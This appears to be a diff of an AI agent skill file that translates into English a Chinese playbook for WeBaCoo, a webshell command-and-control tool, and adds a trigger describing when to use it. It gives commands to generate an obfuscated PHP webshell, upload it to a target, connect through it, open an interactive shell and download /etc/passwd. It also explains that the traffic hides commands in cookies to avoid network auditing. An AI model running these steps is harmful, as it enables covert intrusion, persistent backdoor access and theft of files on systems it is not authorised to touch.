@@ -2,40 +2,43 @@
 name: webacoo-encoded-shell
 description: "WeBaCoo: HTTP covert channel remote control. Signals: persistence, backdoor, connect webshell, interactive shell mode, download."
 zh-signals: "WeBaCoo: HTTP 隐蔽信道远控。信号:持久化,后门,连接 WebShell,交互 shell 模式,下载。"
+when-to-use: >-
+  Use when you have a WeBaCoo-generated webshell and need an HTTP covert
+  channel for interactive shell access and file download.
 ---
 
 # WeBaCoo
 
-- 攻击大类:C15 C2与远控
-- 上游仓库:https://github.com/anestisb/WeBaCoo
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C15 C2 and Remote Control
+- Upstream Repository: https://github.com/anestisb/WeBaCoo
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/anestisb/WeBaCoo
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python webacoo -g -o shell.php` | 生成混淆 PHP WebShell |
-| `python webacoo -t -u https://t.com/shell.php` | 连接 WebShell |
-| `:shell` | 交互 shell 模式 |
-| `:download /etc/passwd` | 下载 |
-| `:upload local.txt /tmp/` | 上传 |
+| `python webacoo -g -o shell.php` | Generate an obfuscated PHP WebShell |
+| `python webacoo -t -u https://t.com/shell.php` | Connect to the WebShell |
+| `:shell` | Interactive shell mode |
+| `:download /etc/passwd` | Download |
+| `:upload local.txt /tmp/` | Upload |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### HTTP 隐蔽信道远控
+### HTTP Covert Channel Remote Control
 
 ```bash
-python webacoo -g -o s.php && 上传
+python webacoo -g -o s.php && upload it
 python webacoo -t -u https://t.com/images/s.php
-# 请求伪装成正常页面访问,Cookie 传指令,流量特征低
+# Requests mimic normal page visits, commands travel in the Cookie, and the traffic signature stays low
 ```
 
-## 注意事项
+## Notes
 
-混淆 PHP WebShell,通信藏在 HTTP Cookie 中,网络层难以审计,老牌隐蔽 C2。
+An obfuscated PHP WebShell whose communication is hidden in HTTP cookies, hard to audit at the network layer; a long-standing covert C2.
